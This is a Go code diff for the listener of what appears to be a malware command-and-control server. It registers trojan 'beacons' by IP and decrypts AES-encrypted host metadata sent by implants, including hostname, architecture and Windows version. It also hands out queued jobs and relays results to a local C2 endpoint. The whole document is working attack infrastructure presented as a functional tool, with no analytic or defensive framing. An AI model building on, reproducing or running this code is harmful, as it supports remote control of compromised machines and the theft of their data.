@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"reflect"
+	"strings"
 )
 
 func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bool) {
@@ -25,7 +26,12 @@ func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bo
 		fmt.Println("AESa 16BYTES not match")
 
 		return res, false
-	} else if reflect.DeepEqual(listener.A, aAES.DecryptData(cookie_decode)) {
+	}
+	decrypt, succ := aAES.DecryptData(cookie_decode)
+	if !succ {
+		println("decrypt A fail.")
+	}
+	if reflect.DeepEqual(listener.A, decrypt) {
 		if Check_Beacon_ip(listener, ip) {
 			removeBeaconByIP(listener, ip) //暂时只考虑一个ip一个木马的情况
 			Create_beacon_1(listener, ip)
@@ -60,25 +66,27 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			Create_beacon_2(listener, &CusAes, Srvkey, ip, domain, i)
 			SrvAes := Mod_Pow(Bytes_To_BigInt(ReverseBytes(listener.A)), Srvkey)
 
-			fmt.Printf("%x", stringToBytes(listener.Beacons[i].AESkey))
+			fmt.Printf("%x", stringToBigint(listener.Beacons[i].AESkey))
 
 			res = append(res, ReverseBytes(SrvAes.Bytes())...)
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
-			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
 
-			var beacon_tmp Beacon
+			bigInt := new(big.Int)
+			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+			json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
 
-			err := json.Unmarshal(json_byte, &beacon_tmp)
-			if err != nil {
-				fmt.Println("Error:", err)
-			}
+			println(string(json_byte))
 
-			listener.Beacons[i].Hostname = beacon_tmp.Hostname
-			listener.Beacons[i].Arch = beacon_tmp.Arch
-			listener.Beacons[i].System = beacon_tmp.System
+			jsonData, _ := parseJSON(string(json_byte))
+
+			mtdt := jsonData["mtdt"]
+
+			listener.Beacons[i].Hostname = mtdt["h_name"]
+			listener.Beacons[i].Arch = mtdt["arch"]
+			listener.Beacons[i].System = mtdt["wver"]
 
 			println("saving xml")
 			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)
@@ -86,9 +94,12 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
-			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
-			if json_byte == nil {
+
+			bigInt := new(big.Int)
+			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+
+			if len(body) == 0 {
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
 				} else {
@@ -97,6 +108,7 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 					return ReverseBytes(res), true
 				}
 			} else {
+				json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
 				remove_job(listener, i)
 				json_byte = append(json_byte, 0x00, IntToUint8(i))
 				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
@@ -113,10 +125,21 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 
 }
 
-func printkey(key []byte) {
-	fmt.Printf("\n ")
-	for _, b := range key {
-		fmt.Printf("%02x ", b)
+func printkey(arr []byte) {
+	i := 0
+	for i < len(arr) {
+		if i%16 == 0 && i != 0 {
+			fmt.Print("        ")
+			j := 0
+			for j < 16 {
+				fmt.Printf("%c", arr[i-16+j])
+				j += 1
+			}
+
+			fmt.Println("")
+		}
+		fmt.Printf("%02x ", arr[i])
+		i += 1
 	}
 }
 
@@ -130,7 +153,7 @@ func GetBytes(data []byte, length int) []byte {
 	return res
 }
 
-func stringToBytes(s string) []byte {
+func stringToBigint(s string) []byte {
 	num := new(big.Int)
 	_, ok := num.SetString(s, 10)
 	if !ok {
@@ -165,4 +188,22 @@ func IntToUint8(num int) uint8 {
 	}
 
 	return uint8(num)
+}
+
+func parseJSON(data string) (map[string]map[string]string, error) {
+	// 清理 JSON 数据，去除不可见字符
+	cleanData := strings.Map(func(r rune) rune {
+		if r >= 32 || r == '\n' || r == '\r' || r == '\t' {
+			return r
+		}
+		return -1
+	}, data)
+
+	var jsonData map[string]map[string]string
+	err := json.Unmarshal([]byte(cleanData), &jsonData)
+	if err != nil {
+		return nil, err
+	}
+
+	return jsonData, nil
 }
